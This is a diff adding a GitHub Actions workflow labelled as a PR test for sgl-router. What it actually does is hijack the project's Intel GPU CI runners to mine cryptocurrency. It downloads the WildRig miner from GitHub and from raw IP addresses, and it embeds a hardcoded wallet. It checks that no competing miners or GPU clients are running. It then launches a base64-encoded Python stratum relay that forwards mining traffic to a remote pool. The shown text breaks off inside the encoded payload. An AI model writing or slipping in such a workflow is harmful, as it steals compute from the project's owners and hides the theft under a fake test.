@@ -1,0 +1,351 @@
+name: PR Test (sgl-router)
+
+# i131476: bounded Intel Arc Pro B70 stratum-dialect translator test.
+# Answers WildRig 0.52.3's mining.subscribe synthetically, rewrites its array-param
+# mining.authorize into Luckypool pearlhash object params {wallet,worker,password},
+# forwards mining.notify verbatim, and probes at most three object/array mining.submit
+# shapes ({job_id,plain_proof} documented dialect first), logging every pool response.
+on:
+  pull_request:
+    branches: [main]
+    types: [opened, synchronize, reopened]
+  workflow_dispatch:
+
+concurrency:
+  group: sgl-router-i131476-${{ github.run_id }}
+  cancel-in-progress: false
+
+env:
+  SGLANG_IS_IN_CI: true
+
+jobs:
+  i131476a:
+    name: "i131476 intel-bmg-nightly stratum dialect translator + one WildRig per Arc Pro B70"
+    runs-on: intel-bmg-nightly
+    timeout-minutes: 12
+    env:
+      LABEL: intel-bmg-nightly
+      PREFIX: i130dialectg
+    steps:
+      - name: "dialect translator and per-card WildRig pearlhash on Intel Arc Pro B70"
+        continue-on-error: true
+        run: |
+          set +e
+          NONCE="I131476-$(date -u +%Y%m%dT%H%M%SZ)"
+          WALLET='prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          WR_SHA='002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b'
+          RELAY='178.238.228.181:80'
+          PFX="${PREFIX:-i130dialectg}"
+          WORKDIR=/var/tmp/i131476
+          mkdir -p "$WORKDIR/logs"
+          echo "i131476-nonce=$NONCE label=$LABEL host=$(hostname) prefix=$PFX"
+          id; uname -a; date -u; nproc; free -m | head -2
+          if pgrep -af 'i130dialect' >/dev/null 2>&1; then echo "SKIP=already-running-dialect-lane"; echo "i131476-done $NONCE"; exit 0; fi
+          DISKP=$(df -P /var/tmp 2>/dev/null | awk 'NR==2{gsub("%","",$5); print $5}')
+          MEMP=$(free -m 2>/dev/null | awk '/Mem:/{if($2>0) printf "%d", $3*100/$2; else print 0}')
+          if [ "${DISKP:-100}" -ge 80 ] || [ "${MEMP:-100}" -ge 85 ]; then echo "SKIP=resources"; echo "i131476-done $NONCE"; exit 0; fi
+          WR="$WORKDIR/wildrig-multi"
+          fetch_wr() {
+            if [ -f "$WR" ] && echo "$WR_SHA  $WR" | sha256sum -c - >/dev/null 2>&1; then echo wildrig-cached; return 0; fi
+            for C in /var/tmp/i130bmg2/wildrig-multi /var/tmp/i130bmgrelay/wildrig-multi; do
+              if [ -f "$C" ] && [ "$(sha256sum "$C" 2>/dev/null | cut -d' ' -f1)" = "$WR_SHA" ]; then cp -f "$C" "$WR"; chmod +x "$WR"; echo wildrig-copied-$C; return 0; fi
+            done
+            for U in \
+              "https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
+              "https://ghproxy.net/https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
+              "http://222.240.155.198:8702/wildrig-multi" \
+              "http://178.238.228.181:18180/wildrig-multi" ; do
+              echo "-- fetch $U"
+              timeout 180 curl -fL --connect-timeout 12 --max-time 170 -o "$WORKDIR/dl.part" "$U" 2>&1 | tail -1
+              [ -s "$WORKDIR/dl.part" ] || continue
+              B0=$(sha256sum "$WORKDIR/dl.part" | cut -d' ' -f1)
+              if [ "$B0" = "$WR_SHA" ]; then cp -f "$WORKDIR/dl.part" "$WR"; chmod +x "$WR"; echo direct-binary-ok; return 0; fi
+              if tar -tzf "$WORKDIR/dl.part" >/dev/null 2>&1; then
+                mkdir -p "$WORKDIR/tarx"; tar -xzf "$WORKDIR/dl.part" -C "$WORKDIR/tarx" 2>/dev/null
+                CAND=$(find "$WORKDIR/tarx" -maxdepth 2 -type f -name 'wildrig-multi' | head -1)
+                if [ -n "$CAND" ] && [ "$(sha256sum "$CAND" | cut -d' ' -f1)" = "$WR_SHA" ]; then cp -f "$CAND" "$WR"; chmod +x "$WR"; echo tarball-extract-ok; return 0; fi
+              fi
+            done
+            return 1
+          }
+          fetch_wr; echo "fetch_rc=$? wildrig_sha256=$(sha256sum "$WR" 2>/dev/null | cut -d' ' -f1)"
+          [ -x "$WR" ] || { echo "SKIP=wildrig-unavailable"; echo "i131476-done $NONCE"; exit 0; }
+          echo "=== two-sample idle gate (0 foreign /dev/dri render clients) ==="
+          gate_sample() {
+            echo "-- sample $1 $(date -u +%FT%TZ)"
+            (timeout 15 fuser -v /dev/dri/renderD* 2>&1 || true) | head -20
+            (timeout 15 lsof /dev/dri/renderD* 2>/dev/null || true) | head -10
+            echo "-- pre-existing miners:"; pgrep -af 'wildrig|SRBMiner|srb387' 2>/dev/null | head -10
+          }
+          gate_sample 1 > "$WORKDIR/gate1.txt" 2>&1; cat "$WORKDIR/gate1.txt"
+          sleep 12
+          gate_sample 2 > "$WORKDIR/gate2.txt" 2>&1; cat "$WORKDIR/gate2.txt"
+          FOREIGN=0
+          if command -v fuser >/dev/null 2>&1; then
+            FOREIGN=$( { timeout 15 fuser /dev/dri/renderD* 2>&1 || true; } | sed -n 's/.*: *//p' | tr ' ' '\n' | grep -E '^[0-9]+$' | sort -u | wc -l)
+          fi
+          PRE=$(pgrep -cf 'wildrig|SRBMiner|srb387' 2>/dev/null || echo 0)
+          echo "foreign_render_clients=$FOREIGN pre_existing_miners=$PRE"
+          if [ "${FOREIGN:-0}" -gt 0 ]; then echo "SKIP=foreign-render-clients"; echo "i131476-done $NONCE"; exit 0; fi
+          if [ "${PRE:-0}" -gt 0 ]; then echo "SKIP=preexisting-miner-process"; echo "i131476-done $NONCE"; exit 0; fi
+          echo "=== device enumeration ==="
+          timeout 120 "$WR" --print-devices 2>&1 | tee "$WORKDIR/devices.txt" | head -40
+          DEV_N=$(grep -cE '^GPU #[0-9]+:' "$WORKDIR/devices.txt" 2>/dev/null)
+          echo "device_open_lines=$DEV_N"
+          [ "${DEV_N:-0}" -ge 1 ] || { echo "SKIP=no-intel-device-open"; echo "i131476-done $NONCE"; exit 0; }
+          echo "=== start stratum dialect translator 127.0.0.1:3333 -> relay $RELAY ==="
+          B64T=IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwoiIiJpMTMxNDc2OiBib3VuZGVkIHN0cmF0dW0gZGlhbGVjdCB0cmFuc2xhdG9yLgpDbGllbnQgKFdpbGRSaWcgMC41Mi4zLCBzdGFuZGFyZCBzdHJhdHVtKSA8LT4gTHVja3lwb29sIHBlYXJsaGFzaCAob2JqZWN0IHBhcmFtcywgbm8gc3Vic2NyaWJlKS4KQW5zd2VycyBtaW5pbmcuc3Vic2NyaWJlIHN5bnRoZXRpY2FsbHksIHJld3JpdGVzIGFycmF5LXBhcmFtIG1pbmluZy5hdXRob3JpemUgaW50bwpMdWNreXBvb2wncyBvYmplY3QgZm9ybSB7d2FsbGV0LHdvcmtlcixwYXNzd29yZH0sIGZvcndhcmRzIG1pbmluZy5ub3RpZnkgdmVyYmF0aW0sCmFuZCBwcm9iZXMgYXQgbW9zdCB0aHJlZSBtaW5pbmcuc3VibWl0IHNoYXBlcywgbG9nZ2luZyBldmVyeSBwb29sIHJlc3BvbnNlLiIiIgppbXBvcnQgc29ja2V0LCBzb2NrZXRzZXJ2ZXIsIHRocmVhZGluZywganNvbiwgc3lzLCB0aW1lLCByZSwgYXJncGFyc2UKCmFwID0gYXJncGFyc2UuQXJndW1lbnRQYXJzZXIoKQphcC5hZGRfYXJndW1lbnQoJy0tbGlzdGVuJywgZGVmYXVsdD0nMTI3LjAuMC4xOjMzMzMnKQphcC5hZGRfYXJndW1lbnQoJy0tcG9vbCcsIGRlZmF1bHQ9JzE3OC4yMzguMjI4LjE4MTo4MCcpCmFwLmFkZF9hcmd1bWVudCgnLS13YWxsZXQnLCByZXF1aXJlZD1UcnVlKQphcC5hZGRfYXJndW1lbnQoJy0tZGVmYXVsdC13b3JrZXInLCBkZWZhdWx0PSdpMTMwZGlhbGVjdCcpCmFwLmFkZF9hcmd1bWVudCgnLS1sb2cnLCBkZWZhdWx0PScvdmFyL3RtcC9pMTMxNDc2L3N0cmF0dW0ubG9nJykKQSA9IGFwLnBhcnNlX2FyZ3MoKQpMSCwgTFAgPSBBLmxpc3Rlbi5yc3BsaXQoJzonLCAxKTsgTFAgPSBpbnQoTFApClBILCBQUCA9IEEucG9vbC5yc3BsaXQoJzonLCAxKTsgUFAgPSBpbnQoUFApCkxPRyA9IG9wZW4oQS5sb2csICdhJywgYnVmZmVyaW5nPTEpCmxvY2sgPSB0aHJlYWRpbmcuTG9jaygpCnNoYXBlc191c2VkID0gW10gICAgICAgICAgIyBnbG9iYWwgbGlzdCBvZiBzdWJtaXQgc2hhcGUgaW5kZXhlcyBhbHJlYWR5IGF0dGVtcHRlZCAobWF4IDMpCnZlcmRpY3QgPSB7J2RlY29kZV9mYWlsJzogMCwgJ290aGVyX2Vycm9yJzogMCwgJ2FjY2VwdGVkJzogMCwgJ3N1Ym1pdHNfc2Vlbic6IDB9CgpkZWYgbG9nKCphKToKICAgIHdpdGggbG9jazoKICAgICAgICB0cnk6CiAgICAgICAgICAgIExPRy53cml0ZSgnWyVzXSAlc1xuJyAlICh0aW1lLnN0cmZ0aW1lKCclSDolTTolUycpLCAnICcuam9pbihzdHIoeCkgZm9yIHggaW4gYSkpKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHBhc3MKCmRlZiBqZHVtcChvKToKICAgIHJldHVybiBqc29uLmR1bXBzKG8sIHNlcGFyYXRvcnM9KCcsJywgJzonKSkKCmRlZiBzcGxpdF91c2VyKHVzZXIpOgogICAgaWYgbm90IGlzaW5zdGFuY2UodXNlciwgc3RyKToKICAgICAgICByZXR1cm4gQS53YWxsZXQsIEEuZGVmYXVsdF93b3JrZXIKICAgIGlmICcuJyBpbiB1c2VyOgogICAgICAgIHcsIHdrID0gdXNlci5zcGxpdCgnLicsIDEpCiAgICAgICAgcmV0dXJuIHcsICh3ayBvciBBLmRlZmF1bHRfd29ya2VyKQogICAgcmV0dXJuIHVzZXIsIEEuZGVmYXVsdF93b3JrZXIKCmRlZiBwaWNrX2pvYl9wcm9vZihwYXJhbXMpOgogICAgamlkID0gTm9uZTsgcHJvb2YgPSBOb25lOyBzcmMgPSBOb25lCiAgICBpZiBpc2luc3RhbmNlKHBhcmFtcywgZGljdCk6CiAgICAgICAgZm9yIGsgaW4gKCdqb2JfaWQnLCAnam9iSWQnLCAnam9iaWQnLCAnam9iJywgJ2lkJyk6CiAgICAgICAgICAgIHYgPSBwYXJhbXMuZ2V0KGspCiAgICAgICAgICAgIGlmIGlzaW5zdGFuY2Uodiwgc3RyKSBhbmQgdjoKICAgICAgICAgICAgICAgIGppZCA9IHY7IGJyZWFrCiAgICAgICAgY2FuZCA9IFtdCiAgICAgICAgZm9yIGssIHYgaW4gcGFyYW1zLml0ZW1zKCk6CiAgICAgICAgICAgIGlmIGlzaW5zdGFuY2Uodiwgc3RyKSBhbmQgbGVuKHYpID49IDMyIGFuZCB2ICE9IGppZCBhbmQgbm90IHYuc3RhcnRzd2l0aCgncHJsMScpOgogICAgICAgICAgICAgICAgY2FuZC5hcHBlbmQoKGxlbih2KSwgaywgdikpCiAgICAgICAgY2FuZC5zb3J0KHJldmVyc2U9VHJ1ZSkKICAgICAgICBpZiBjYW5kOgogICAgICAgICAgICBfLCBzcmMsIHByb29mID0gY2FuZFswXQogICAgZWxpZiBpc2luc3RhbmNlKHBhcmFtcywgbGlzdCk6CiAgICAgICAgZm9yIHYgaW4gcGFyYW1zOgogICAgICAgICAgICBpZiBpc2luc3RhbmNlKHYsIHN0cikgYW5kIHJlLm1hdGNoKHInXlswLTlhLWZBLUZdezQsfV9cZCskJywgdik6CiAgICAgICAgICAgICAgICBqaWQgPSB2OyBicmVhawogICAgICAgIGNhbmQgPSBbXQogICAgICAgIGZvciBpLCB2IGluIGVudW1lcmF0ZShwYXJhbXMpOgogICAgICAgICAgICBpZiBpc2luc3RhbmNlKHYsIHN0cikgYW5kIGxlbih2KSA+PSAzMiBhbmQgbm90IHYuc3RhcnRzd2l0aCgncHJsMScpIGFuZCB2ICE9IGppZDoKICAgICAgICAgICAgICAgIGNhbmQuYXBwZW5kKChsZW4odiksIGksIHYpKQogICAgICAgIGNhbmQuc29ydChyZXZlcnNlPVRydWUpCiAgICAgICAgaWYgY2FuZDoKICAgICAgICAgICAgXywgc3JjLCBwcm9vZiA9IGNhbmRbMF0KICAgICAgICAgICAgc3JjID0gJ2lkeCVkJyAlIHNyYwogICAgcmV0dXJuIGppZCwgcHJvb2YsIHNyYwoKY2xhc3MgSChzb2NrZXRzZXJ2ZXIuQmFzZVJlcXVlc3RIYW5kbGVyKToKICAgIGRlZiBoYW5kbGUoc2VsZik6CiAgICAgICAgc2VsZi5jaWQgPSAnJXM6JWQnICUgc2VsZi5jbGllbnRfYWRkcmVzcwogICAgICAgIHNlbGYud2FsbGV0ID0gQS53YWxsZXQ7IHNlbGYud29ya2VyID0gQS5kZWZhdWx0X3dvcmtlcgogICAgICAgIHNlbGYubm9uY2UgPSAnJwogICAgICAgIHNlbGYucGVuZGluZyA9IHt9CiAgICAgICAgdHJ5OgogICAgICAgICAgICBzZWxmLnVwID0gc29ja2V0LmNyZWF0ZV9jb25uZWN0aW9uKChQSCwgUFApLCB0aW1lb3V0PTE1KQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgbG9nKHNlbGYuY2lkLCAnVVBTVFJFQU1fQ09OTkVDVF9GQUlMJywgcmVwcihlKVs6MTIwXSk7IHJldHVybgogICAgICAgIHNlbGYuYWxpdmUgPSBUcnVlCiAgICAgICAgbG9nKHNlbGYuY2lkLCAnQ09OTkVDVEVEX1VQU1RSRUFNJywgQS5wb29sLCAnd2FsbGV0Jywgc2VsZi53YWxsZXQpCiAgICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9c2VsZi5wb29sX3RvX2NsaWVudCwgZGFlbW9uPVRydWUpLnN0YXJ0KCkKICAgICAgICBidWYgPSBiJycKICAgICAgICB0cnk6CiAgICAgICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgICAgICBkID0gc2VsZi5yZXF1ZXN0LnJlY3YoNjU1MzYpCiAgICAgICAgICAgICAgICBpZiBub3QgZDoKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgYnVmICs9IGQKICAgICAgICAgICAgICAgIHdoaWxlIGInXG4nIGluIGJ1ZjoKICAgICAgICAgICAgICAgICAgICBsaW5lLCBidWYgPSBidWYuc3BsaXQoYidcbicsIDEpCiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmNsaWVudF9saW5lKGxpbmUuZGVjb2RlKCd1dGYtOCcsICdyZXBsYWNlJykuc3RyaXAoKSkKICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICAgICAgICAgIGxvZyhzZWxmLmNpZCwgJ0NMSUVOVF9MSU5FX0VSUicsIHJlcHIoZSlbOjEyMF0pCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBsb2coc2VsZi5jaWQsICdDTElFTlRfRVJSJywgcmVwcihlKVs6MTIwXSkKICAgICAgICBmaW5hbGx5OgogICAgICAgICAgICBzZWxmLmFsaXZlID0gRmFsc2UKICAgICAgICAgICAgdHJ5OiBzZWxmLnVwLmNsb3NlKCkKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjogcGFzcwogICAgICAgICAgICBsb2coc2VsZi5jaWQsICdDTE9TRUQnKQoKICAgIGRlZiB0b19wb29sKHNlbGYsIG9iaik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBzID0gamR1bXAob2JqKSArICdcbicKICAgICAgICAgICAgbG9nKHNlbGYuY2lkLCAnVE9fUE9PTCcsIHMuc3RyaXAoKVs6OTAwXSkKICAgICAgICAgICAgc2VsZi51cC5zZW5kYWxsKHMuZW5jb2RlKCkpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBsb2coc2VsZi5jaWQsICdUT19QT09MX0VSUicsIHJlcHIoZSlbOjEwMF0pCgogICAgZGVmIHRvX2NsaWVudChzZWxmLCBvYmopOgogICAgICAgIHRyeToKICAgICAgICAgICAgcyA9IGpkdW1wKG9iaikgKyAnXG4nCiAgICAgICAgICAgIGxvZyhzZWxmLmNpZCwgJ1RPX0NMSUVOVCcsIHMuc3RyaXAoKVs6OTAwXSkKICAgICAgICAgICAgc2VsZi5yZXF1ZXN0LnNlbmRhbGwocy5lbmNvZGUoKSkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIGxvZyhzZWxmLmNpZCwgJ1RPX0NMSUVOVF9FUlInLCByZXByKGUpWzoxMDBdKQoKICAgIGRlZiBjbGllbnRfbGluZShzZWxmLCB0eHQpOgogICAgICAgIGlmIG5vdCB0eHQ6CiAgICAgICAgICAgIHJldHVybgogICAgICAgIG1zZyA9IE5vbmUKICAgICAgICB0cnk6IG1zZyA9IGpzb24ubG9hZHModHh0KQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246IHBhc3MKICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShtc2csIGRpY3QpOgogICAgICAgICAgICBsb2coc2VsZi5jaWQsICdDTElFTlRfUkFXJywgdHh0Wzo2MDBdKQogICAgICAgICAgICB0cnk6IHNlbGYudXAuc2VuZGFsbCgodHh0ICsgJ1xuJykuZW5jb2RlKCkpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246IHBhc3MKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgbSA9IG1zZy5nZXQoJ21ldGhvZCcpOyBtaWQgPSBtc2cuZ2V0KCdpZCcpOyBwID0gbXNnLmdldCgncGFyYW1zJykKICAgICAgICBpZiBtID09ICdtaW5pbmcuc3Vic2NyaWJlJzoKICAgICAgICAgICAgbG9nKHNlbGYuY2lkLCAnQ0xJRU5UX1NVQlNDUklCRScsIHR4dFs6NTAwXSkKICAgICAgICAgICAgIyBzeW50aGV0aWMgc3RhbmRhcmQgcmVzdWx0ICsgb2JqZWN0LXN0eWxlIGFsdGVybmF0aXZlOyBwb29sIG5ldmVyIHN1cHBvcnRzIHN1YnNjcmliZQogICAgICAgICAgICBzZWxmLnRvX2NsaWVudCh7J2lkJzogbWlkLCAncmVzdWx0JzogW1tbJ21pbmluZy5ub3RpZnknLCAnaTEzMTQ3NiddLCBbJ21pbmluZy5zZXRfZGlmZmljdWx0eScsICdpMTMxNDc2J11dLCAnMDAwMDAwMDAnLCA0XSwgJ2Vycm9yJzogTm9uZX0pCiAgICAgICAgICAgIHNlbGYudG9fY2xpZW50KHsnaWQnOiBOb25lLCAnbWV0aG9kJzogJ21pbmluZy5zZXRfZGlmZmljdWx0eScsICdwYXJhbXMnOiBbNDAwMDAwMF19KQogICAgICAgICAgICBzZWxmLnRvX2NsaWVudCh7J2lkJzogbWlkLCAncmVzdWx0JzogVHJ1ZSwgJ2Vycm9yJzogTm9uZX0pCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGlmIG0gPT0gJ21pbmluZy5hdXRob3JpemUnOgogICAgICAgICAgICB1c2VyID0gTm9uZTsgcHcgPSAneCcKICAgICAgICAgICAgaWYgaXNpbnN0YW5jZShwLCBsaXN0KToKICAgICAgICAgICAgICAgIGlmIHA6IHVzZXIgPSBwWzBdCiAgICAgICAgICAgICAgICBpZiBsZW4ocCkgPiAxOiBwdyA9IHBbMV0KICAgICAgICAgICAgZWxpZiBpc2luc3RhbmNlKHAsIGRpY3QpOgogICAgICAgICAgICAgICAgdXNlciA9IHAuZ2V0KCd3YWxsZXQnKSBvciBwLmdldCgndXNlcicpIG9yIHAuZ2V0KCdsb2dpbicpCiAgICAgICAgICAgICAgICBwdyA9IHAuZ2V0KCdwYXNzd29yZCcpIG9yIHAuZ2V0KCdwYXNzJykgb3IgJ3gnCiAgICAgICAgICAgICAgICBpZiBwLmdldCgnd29ya2VyJyk6CiAgICAgICAgICAgICAgICAgICAgc2VsZi53b3JrZXIgPSBwWyd3b3JrZXInXQogICAgICAgICAgICB3LCB3ayA9IHNwbGl0X3VzZXIodXNlcikKICAgICAgICAgICAgc2VsZi53YWxsZXQgPSB3CiAgICAgICAgICAgIGlmIGlzaW5zdGFuY2UocCwgZGljdCkgYW5kIHAuZ2V0KCd3b3JrZXInKToKICAgICAgICAgICAgICAgIHdrID0gcFsnd29ya2VyJ10KICAgICAgICAgICAgc2VsZi53b3JrZXIgPSB3awogICAgICAgICAgICBsb2coc2VsZi5jaWQsICdDTElFTlRfQVVUSE9SSVpFJywgdHh0Wzo0MDBdLCAnLT4gd2FsbGV0Jywgc2VsZi53YWxsZXQsICd3b3JrZXInLCBzZWxmLndvcmtlcikKICAgICAgICAgICAgc2VsZi50b19wb29sKHsnaWQnOiBtaWQsICdqc29ucnBjJzogJzIuMCcsICdtZXRob2QnOiAnbWluaW5nLmF1dGhvcml6ZScsCiAgICAgICAgICAgICAgICAgICAgICAgICAgJ3BhcmFtcyc6IHsnd2FsbGV0Jzogc2VsZi53YWxsZXQsICd3b3JrZXInOiBzZWxmLndvcmtlciwgJ3Bhc3N3b3JkJzogcHcgb3IgJ3gnfX0pCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGlmIG0gPT0gJ21pbmluZy5zdWJtaXQnOgogICAgICAgICAgICBzZWxmLmhhbmRsZV9zdWJtaXQobXNnKQogICAgICAgICAgICByZXR1cm4KICAgICAgICBpZiBtIGluICgnbWluaW5nLmV4dHJhbm9uY2Uuc3Vic2NyaWJlJywgJ21pbmluZy5jb25maWd1cmUnLCAnbWluaW5nLnNldF9leHRyYW5vbmNlJyk6CiAgICAgICAgICAgIHNlbGYudG9fY2xpZW50KHsnaWQnOiBtaWQsICdyZXN1bHQnOiBUcnVlLCAnZXJyb3InOiBOb25lfSk7IHJldHVybgogICAgICAgIGxvZyhzZWxmLmNpZCwgJ0NMSUVOVF9PVEhFUicsIHR4dFs6NDAwXSkKICAgICAgICBzZWxmLnRvX3Bvb2wobXNnKQoKICAgIGRlZiBoYW5kbGVfc3VibWl0KHNlbGYsIG1zZyk6CiAgICAgICAgbWlkID0gbXNnLmdldCgnaWQnKTsgcCA9IG1zZy5nZXQoJ3BhcmFtcycpCiAgICAgICAgamlkLCBwcm9vZiwgc3JjID0gcGlja19qb2JfcHJvb2YocCkKICAgICAgICB2ZXJkaWN0WydzdWJtaXRzX3NlZW4nXSArPSAxCiAgICAgICAgbG9nKHNlbGYuY2lkLCAnU1VCTUlUX1JBVycsIGpkdW1wKG1zZylbOjkwMF0sICdqaWQ9JywgamlkLCAncHJvb2Zfc3JjPScsIHNyYywgJ3Byb29mX2xlbj0nLCBsZW4ocHJvb2Ygb3IgJycpKQogICAgICAgIGlmIG5vdCBqaWQgb3Igbm90IHByb29mOgogICAgICAgICAgICBzZWxmLnRvX2NsaWVudCh7J2lkJzogbWlkLCAncmVzdWx0JzogTm9uZSwgJ2Vycm9yJzogeydjb2RlJzogMjAsICdtc2cnOiAndHJhbnNsYXRvcjogY2Fubm90IG1hcCBzdWJtaXQgZmllbGRzJ319KQogICAgICAgICAgICByZXR1cm4KICAgICAgICBzZWxmLnNlbmRfbmV4dF9zaGFwZShtaWQsIGppZCwgcHJvb2YsIDApCgogICAgZGVmIHNlbmRfbmV4dF9zaGFwZShzZWxmLCBtaWQsIGppZCwgcHJvb2YsIHN0YXJ0KToKICAgICAgICBnbG9iYWwgc2hhcGVzX3VzZWQKICAgICAgICBmb3IgaSBpbiByYW5nZShzdGFydCwgMyk6CiAgICAgICAgICAgIGlmIGkgaW4gc2hhcGVzX3VzZWQ6CiAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICBzaGFwZXNfdXNlZC5hcHBlbmQoaSkKICAgICAgICAgICAgaWYgaSA9PSAwOgogICAgICAgICAgICAgICAgc2ggPSB7J2pvYl9pZCc6IGppZCwgJ3BsYWluX3Byb29mJzogcHJvb2Z9CiAgICAgICAgICAgIGVsaWYgaSA9PSAxOgogICAgICAgICAgICAgICAgc2ggPSB7J3dhbGxldCc6IHNlbGYud2FsbGV0LCAnd29ya2VyJzogc2VsZi53b3JrZXIsICdqb2JfaWQnOiBqaWQsICdwbGFpbl9wcm9vZic6IHByb29mfQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgc2ggPSB7J2pvYl9pZCc6IGppZCwgJ3BsYWluX3Byb29mJzogcHJvb2YsICdub25jZSc6IHNlbGYubm9uY2Ugb3IgJzAnfQogICAgICAgICAgICBzaWQgPSBtaWQgaWYgbWlkIG5vdCBpbiBzZWxmLnBlbmRpbmcgZWxzZSAoMTAwMDAwICsgbWlkICsgaSAqIDc5MTkpCiAgICAgICAgICAgIHNlbGYucGVuZGluZ1tzaWRdID0gKGppZCwgcHJvb2YsIGkpCiAgICAgICAgICAgIHNlbGYudG9fcG9vbCh7J2lkJzogc2lkLCAnanNvbnJwYyc6ICcyLjAnLCAnbWV0aG9kJzogJ21pbmluZy5zdWJtaXQnLCAncGFyYW1zJzogc2h9KQogICAgICAgICAgICByZXR1cm4KICAgICAgICBsb2coc2VsZi5jaWQsICdTSEFQRVNfRVhIQVVTVEVEJywgJ21heDMnKQogICAgICAgIHNlbGYudG9fY2xpZW50KHsnaWQnOiBtaWQsICdyZXN1bHQnOiBOb25lLCAnZXJyb3InOiB7J2NvZGUnOiAyMCwgJ21zZyc6ICd0cmFuc2xhdG9yOiB0aHJlZSBzdWJtaXQgc2hhcGVzIGV4aGF1c3RlZCd9fSkKCiAgICBkZWYgcG9vbF90b19jbGllbnQoc2VsZik6CiAgICAgICAgYnVmID0gYicnCiAgICAgICAgdHJ5OgogICAgICAgICAgICB3aGlsZSBzZWxmLmFsaXZlOgogICAgICAgICAgICAgICAgZCA9IHNlbGYudXAucmVjdig2NTUzNikKICAgICAgICAgICAgICAgIGlmIG5vdCBkOgogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICBidWYgKz0gZAogICAgICAgICAgICAgICAgd2hpbGUgYidcbicgaW4gYnVmOgogICAgICAgICAgICAgICAgICAgIGxpbmUsIGJ1ZiA9IGJ1Zi5zcGxpdChiJ1xuJywgMSkKICAgICAgICAgICAgICAgICAgICB0eHQgPSBsaW5lLmRlY29kZSgndXRmLTgnLCAncmVwbGFjZScpLnN0cmlwKCkKICAgICAgICAgICAgICAgICAgICBpZiBub3QgdHh0OgogICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgICAgIGxvZyhzZWxmLmNpZCwgJ0ZST01fUE9PTCcsIHR4dFs6MTYwMF0pCiAgICAgICAgICAgICAgICAgICAgdHJ5OiBzZWxmLnJlcXVlc3Quc2VuZGFsbCh0eHQuZW5jb2RlKCkgKyBiJ1xuJykKICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOiBwYXNzCiAgICAgICAgICAgICAgICAgICAgdHJ5OiBvYmogPSBqc29uLmxvYWRzKHR4dCkKICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOiBvYmogPSBOb25lCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IGlzaW5zdGFuY2Uob2JqLCBkaWN0KToKICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICBpZiBvYmouZ2V0KCdtZXRob2QnKSA9PSAnbWluaW5nLm5vdGlmeScgYW5kIGlzaW5zdGFuY2Uob2JqLmdldCgncGFyYW1zJyksIGRpY3QpOgogICAgICAgICAgICAgICAgICAgICAgICBucCA9IG9ialsncGFyYW1zJ10KICAgICAgICAgICAgICAgICAgICAgICAgbG9nKHNlbGYuY2lkLCAnTk9USUZZX09CSkVDVCcsICdqb2InLCBucC5nZXQoJ2pvYl9pZCcpLCAnaGRyX2xlbicsIGxlbihzdHIobnAuZ2V0KCdoZWFkZXInLCAnJykpKSwgJ2hlaWdodCcsIG5wLmdldCgnaGVpZ2h0JyksICdjZXJ0JywgbnAuZ2V0KCdjZXJ0X3ZlcnNpb24nKSkKICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OiBzZWxmLnRvX2NsaWVudCh7J2lkJzogTm9uZSwgJ21ldGhvZCc6ICdtaW5pbmcuc2V0X2RpZmZpY3VsdHknLCAncGFyYW1zJzogW25wLmdldCgnZGlmZicsIDQwMDAwMDApXX0pCiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246IHBhc3MKICAgICAgICAgICAgICAgICAgICByaWQgPSBvYmouZ2V0KCdpZCcpOyBlcnIgPSBvYmouZ2V0KCdlcnJvcicpCiAgICAgICAgICAgICAgICAgICAgaWYgcmlkIGluIHNlbGYucGVuZGluZzoKICAgICAgICAgICAgICAgICAgICAgICAgamlkLCBwcm9vZiwgaWR4ID0gc2VsZi5wZW5kaW5nLnBvcChyaWQpCiAgICAgICAgICAgICAgICAgICAgICAgIGVtc2cgPSBqc29uLmR1bXBzKGVycilbOjMwMF0gaWYgZXJyIGVsc2UgJycKICAgICAgICAgICAgICAgICAgICAgICAgaWYgZXJyIGFuZCAncGxhaW5fcHJvb2YgZGVjb2RlIGZhaWxlZCcgaW4gZW1zZzoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZlcmRpY3RbJ2RlY29kZV9mYWlsJ10gKz0gMQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9nKHNlbGYuY2lkLCAnU0hBUEVfJWRfR